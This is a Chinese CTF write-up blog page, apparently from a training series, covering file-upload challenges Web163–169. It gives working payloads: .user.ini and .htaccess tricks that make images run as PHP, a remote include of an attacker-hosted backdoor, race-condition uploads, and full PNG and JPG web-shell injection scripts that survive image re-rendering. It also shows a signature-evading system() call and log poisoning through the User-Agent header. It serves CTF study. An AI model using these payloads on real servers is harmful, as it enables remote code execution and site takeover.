+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622122025405.png"></p>
+<p>经过测试，这里过滤了()[];</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622122641979.png"></p>
+<p>经测试，它还过滤了.这个字符，这会非常棘手</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622123639013.png"></p>
+<p>通过在线的转换工具，可以将ip转为数字，这样就可以把.消去</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622123823122.png"></p>
+<p>输入**&lt;?&#x3D;include’httpsxxx’?&gt;**这样就成功上传了网站，并且这个网站带有后门代码，后门的密码是1<br><strong>前置条件</strong>：先在本地随便搭建一个网站，这个网站要带有后门代码</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622124349232.png"></p>
+<p>然后就是重复上一节课的操作，.user.ini包含以下文件<br>payload:<br>Content-Disposition: form-data; name&#x3D;”file”; <strong>filename&#x3D;”.user.ini”</strong><br>Content-Type: <strong>image&#x2F;png</strong></p>
+<p><strong>GIF89a</strong><br><strong>auto_prepend_file&#x3D;png</strong></p>
+<p><strong>修改方法</strong></p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622135525874.png"></p>
+<p>经过163的做法，我们发现上传文件让user.ini解析貌似不可行，所以这次我们直接把带有后门的网站上传到ini那里去，这样就可以直接解析，命令执行</p>
+<p>具体payload:<br>Content-Disposition: from-data; name&#x3D;”file”; filename&#x3D;”.user.ini”<br>Content-Type: image&#x2F;png<br>GIF89a<br>auto_prepend_file&#x3D;<a target="_blank" rel="noopener" href="http://xxxxx/">http://xxxxx/</a></p>
+<h3 id="Web163-知识点：突破上传删除-利用user-ini包含远程-数字域名"><a href="#Web163-知识点：突破上传删除-利用user-ini包含远程-数字域名" class="headerlink" title="Web163 知识点：突破上传删除&amp;利用user.ini包含远程&amp;数字域名"></a>Web163 知识点：突破上传删除&amp;利用user.ini包含远程&amp;数字域名</h3><p>转换ip网站：<a target="_blank" rel="noopener" href="https://www.bejson.com/convert/ip2int/">https://www.bejson.com/convert/ip2int/</a></p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622130532670.png"></p>
+<p>这一题和上一关不同的地方，就是他会把你上传的文件给直接强制删除掉，所以这里需要用到条件竞争的方法，其他的地方貌似是没什么区别的</p>
+<p><strong>条件竞争</strong>：在上传成功，立马访问，创建型代码（代码被执行后重新新建一个文件）</p>
+<p>删除文件可能的规则：<br>1、什么都删除 此情况只能用条件竞争<br>2、删除后门代码 此情况可以用修改后门代码让他检测不到</p>
+<p><strong>最终解决删除文件的办法</strong>：</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622135250486.png"></p>
+<p>把包含有后门代码的网站写到user.ini上去，这样文件就不会被删除了，这样就不需要另外上传文件了，直接访问upload就可以了</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622134923077.png"></p>
+<p>输入1&#x3D;system(‘ls’);</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622134952977.png"></p>
+<p>输入 1&#x3D;system(“ls ..&#x2F;“);</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622135040553.png"></p>
+<p>输入 1&#x3D;system(“tac ..&#x2F;flag.php”) 得到flag，这题的环境是没问题的，但是上一关的环境不知道哪里卡bug了。</p>
+<h3 id="Web164-知识点：png二次渲染"><a href="#Web164-知识点：png二次渲染" class="headerlink" title="Web164 知识点：png二次渲染"></a>Web164 知识点：png二次渲染</h3><p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622141656681.png"></p>
+<p>上传的文件和本身的文件大小发生了变化，也就是进行了二次渲染。</p>
+<p>二次渲染的目的：一些网站为了让上传的图片更加的美观，以及有些会固定尺寸，或是为了节约网站的空间，就会适当的删除增加代码，这会使得图片里本身存在的后门代码被删除或者修改而失效</p>
+<p>如何进行手工绕过：二次渲染并不是把所有的代码都进行修改，他会和原来的部分有很多一模一样的部分，这个时候我们就需要将木马写到一样的部分中去，这样木马就不会因为渲染而失效了。但是这种操作方案能不能行，需要一定的运气，因为你修改了以后，他说不定就会把你修改的那一块也删掉了。</p>
+<p>脚本生成绕过：直接用大佬写的脚本hhh<br>相关文章：blog.csdn.net&#x2F;qq_40800734&#x2F;article&#x2F;details&#x2F;105920149</p>
+<pre><code class="php">EXP
+&lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+ 
+ 
+ 
+$img = imagecreatetruecolor(32, 32);
+ 
+for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+&#125;
+ 
+imagepng($img,&#39;./1.png&#39;);
+?&gt;
+
+//木马内容 &lt;?$_GET[0]($_POST[1]);?&gt;
+//使用方法：直接运行即可
+</code></pre>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622143208514.png"></p>
+<p>0这个get参数传递控制函数，1这个post参数传递具体执行命令，成功读到根目录下的文件</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622143307808.png"></p>
+<p>直接tac flag.php得到flag</p>
+<p>补充：为什么这里明明是在图片文件里穿🐎，但是木马可以被解析呢？<br>因为它的上传地址发生了变化变成了download.php而不是前面几关的upload，它的整个环境就是php环境，所以是可以成功解析php后门的，所以这个地址就是在暗示你，你只要在图片里传🐎就可以解析了，而不需要上传php文件。<br>如果这个破绽没有给你，那你就还得配合user.ini来帮助你解析后门代码<br>如果user.ini也没用，那就直接gg跑路</p>
+<h3 id="Web165-知识点：jpg二次渲染"><a href="#Web165-知识点：jpg二次渲染" class="headerlink" title="Web165 知识点：jpg二次渲染"></a>Web165 知识点：jpg二次渲染</h3><p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622144137757.png"></p>
+<p>这里是php里面默认的一个库gd-jpeg v1.0会对jpg图片进行二次渲染，看这个标志就很清楚了。</p>
+<pre><code class="php">EXP
+&lt;?php
+    /*
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    jpg_payload.php &lt;jpg_name.jpg&gt;
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+    Sergey Bobrov @Black2Fan.
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+    */
+ 
+    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; //这一行是你要插入的后门代码，可以自行修改
+ 
+ 
+    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;
+        die(&#39;php-gd is not installed&#39;);
+    &#125;
+ 
+    if(!isset($argv[1])) &#123;
+        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
+    &#125;
+ 
+    set_error_handler(&quot;custom_error_handler&quot;);
+ 
+    for($pad = 0; $pad &lt; 1024; $pad++) &#123;
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+ 
+        if($dis-&gt;readShort() != 0xFFD8) &#123;
+            die(&#39;Incorrect SOI marker&#39;);
+        &#125;
+ 
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker === 0xDA) &#123;
+                $startPos = $dis-&gt;seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) &#123;
+                    while((!$dis-&gt;eof())) &#123;
+                        if($dis-&gt;readByte() === 0xFF) &#123;
+                            if($dis-&gt;readByte !== 0x00) &#123;
+                                break;
+                            &#125;
+                        &#125;
+                    &#125;
+                    $stopPos = $dis-&gt;seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                &#125; elseif($correctImage) &#123;
+                    $outStream = $outStreamTmp;
+                &#125; else &#123;
+                    break;
+                &#125;
+                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;
+                    die(&#39;Success!&#39;);
+                &#125; else &#123;
+                    break;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+    unlink(&#39;payload_&#39;.$argv[1]);
+    die(&#39;Something\&#39;s wrong&#39;);
+ 
+    function checkImage($filename, $data, $unlink = FALSE) &#123;
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    &#125;
+ 
+    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;
+            if(isset($m[1])) &#123;
+                $extraBytes = (int)$m[1];
+            &#125;
+        &#125;
+    &#125;
+ 
+    class DataInputStream &#123;
+        private $binData;
+        private $order;
+        private $size;
+ 
+        public function __construct($filename, $order = false, $fromString = false) &#123;
+            $this-&gt;binData = &#39;&#39;;
+            $this-&gt;order = $order;
+            if(!$fromString) &#123;
+                if(!file_exists($filename) || !is_file($filename))
+                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
+                $this-&gt;binData = file_get_contents($filename);
+            &#125; else &#123;
+                $this-&gt;binData = $filename;
+            &#125;
+            $this-&gt;size = strlen($this-&gt;binData);
+        &#125;
+ 
+        public function seek() &#123;
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        &#125;
+ 
+        public function skip($skip) &#123;
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+        &#125;
+ 
+        public function readByte() &#123;
+            if($this-&gt;eof()) &#123;
+                die(&#39;End Of File&#39;);
+            &#125;
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+            return ord($byte);
+        &#125;
+ 
+        public function readShort() &#123;
+            if(strlen($this-&gt;binData) &lt; 2) &#123;
+                die(&#39;End Of File&#39;);
+            &#125;
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) &#123;
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            &#125; else &#123;
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            &#125;
+            return $short;
+        &#125;
+ 
+        public function eof() &#123;
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+        &#125;
+    &#125;
+?&gt;
+    
+</code></pre>
+<p>虽然说是jpg图像，用脚本跑也可能失败，所以得多试几张图片，使用方法见上一关给的那个文章</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622144800662.png"></p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622144815043.png"></p>
+<p>发现上传的图片的后门代码被删掉了，所以手工的插入后门代码是大概率会失败的，还是得用脚本成功给的概率才高。</p>
+<p>脚本运行方法：<br>①：将脚本放置在php.exe的同目录下</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622145149546.png"></p>
+<p>②：把你要插入后门的jpg图片也放到同目录下</p>
+<p>③：在当前目录下运行cmd，输入php jpg.php 11.jpg  (jpg是脚本名字，11是图片名字，这里仅是示例)</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622145454119.png"></p>
+<p>运行完之后会生成payload_11.jpg的字样，这就是已经添加后门代码的图片 </p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622145843455.png"></p>
+<p>能成功看到图片，八成就成功了，如果不行那就再多试几张别的图片，这需要一定的运气</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622145938397.png"></p>
+<p>成功getshell</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622150000527.png"></p>
+<h3 id="Web166-知识点：文件名后缀"><a href="#Web166-知识点：文件名后缀" class="headerlink" title="Web166 知识点：文件名后缀"></a>Web166 知识点：文件名后缀</h3><p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622150331617.png"></p>
+<p>就把文件的后缀修改为zip，然后再植入后门代码就可以了</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622150546312.png"></p>
+<p>没有什么太多的知识点，就是换了个格式</p>
+<h3 id="Web167-知识点：htaccess解析"><a href="#Web167-知识点：htaccess解析" class="headerlink" title="Web167 知识点：htaccess解析"></a>Web167 知识点：htaccess解析</h3><p>htaccess介绍<br>htaccess默认不支持nginx，设置后支持<br>htaccess可以通过设置实现文件解析配置<br>将.png后缀的文件解析成php<br>AddType application&#x2F;x-httpd.php png<br>将 png后缀的文件解析成php</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622151149491.png"></p>
+<p>意义：可以通过htaccess来实现文件的解析配置</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622152547174.png"></p>
+<p>先上传一个1.jpg的后门代码</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622152637075.png"></p>
+<p>payload:<br>Content-Disposition: from-data; name&#x3D;”file”; filename&#x3D;”<strong>.htaccess</strong>“<br>Content-Type: image&#x2F;jpeg<br><strong>AddType application&#x2F;x-httpd-php .jpg</strong><br>让jpg文件以php的格式去解析</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622153037317.png"></p>
+<p>emm，貌似jpg格式不太好解析，那就换成png去解析，重新发个包就可以了</p>
+<h3 id="Web168-知识点：免杀后门-变量拆分绕过-a-’syste’-’m’"><a href="#Web168-知识点：免杀后门-变量拆分绕过-a-’syste’-’m’" class="headerlink" title="Web168 知识点：免杀后门&amp;变量拆分绕过$a&#x3D;’syste’.’m’"></a>Web168 知识点：免杀后门&amp;变量拆分绕过$a&#x3D;’syste’.’m’</h3><p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622153325767.png"></p>
+<p>后门代码不能带eval，会被杀掉</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622153920164.png"></p>
+<p>payload: &lt;?php $a&#x3D;’syste’.’m’;$a(‘tac ..&#x2F;flag.php’);?&gt;<br>把system拆分一下赋给一个变量即可</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622154117896.png"></p>
+<h3 id="Web169-知识点：日志包含"><a href="#Web169-知识点：日志包含" class="headerlink" title="Web169 知识点：日志包含"></a>Web169 知识点：日志包含</h3><p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622160615583.png"><br>payload:<br>Content-Disposition: form-data: name&#x3D;”file”; filename&#x3D;”.user.ini”<br>Content-Type: image&#x2F;png<br>auto_prepend file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622163121714.png"></p>
+<p>UA头里加后门代码</p>
+<p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622160530878-17190450960031.png"></p>
+<p>就成功getshell了</p>
+
+      
+       
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2024 f4k3r
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+<div id="musicMouseDrag" style="position:fixed; z-index: 9999; bottom: 0; right: 50px;">
+    <div id="musicDragArea" style="position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;"></div>
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=298 height=52 src="//music.163.com/outchain/player?type=2&id=427606780&auto=0&height=32"></iframe>
+    </div>
+
+<script>
+    var $DOC = $(document)
+    $('#musicMouseDrag').on('mousedown', function (e) {
+      // 阻止文本选中
+      $DOC.bind("selectstart", function () {
+        return false;
+      });
+      $('#musicDragArea').css('height', '100%');
+      var $moveTarget = $('#musicMouseDrag');
+      $moveTarget.css('border', '1px dashed grey')
+      var div_x = e.pageX - $moveTarget.offset().left;
+      var div_y = e.pageY - $moveTarget.offset().top;
+      $DOC.on('mousemove', function (e) {
+        var targetX = e.pageX - div_x;
+        var targetY = e.pageY - div_y;
+        targetX = targetX < 0 ? 0 : (targetX + $moveTarget.outerWidth() >= window.innerWidth) ? window.innerWidth - $moveTarget.outerWidth() : targetX;
+        targetY = targetY < 0 ? 0 : (targetY + $moveTarget.outerHeight() >= window.innerHeight) ? window.innerHeight - $moveTarget.outerHeight() : targetY;
+        $moveTarget.css({'left': targetX + 'px', 'top': targetY + 'px', 'bottom': 'inherit', 'right': 'inherit'})
+      }).on('mouseup', function () {
+        $DOC.unbind("selectstart");
+        $DOC.off('mousemove')
+        $DOC.off('mouseup')
+        $moveTarget.css('border', 'none')
+        $('#musicDragArea').css('height', '10px');
+      })
+    })
+</script>
+
+</html>
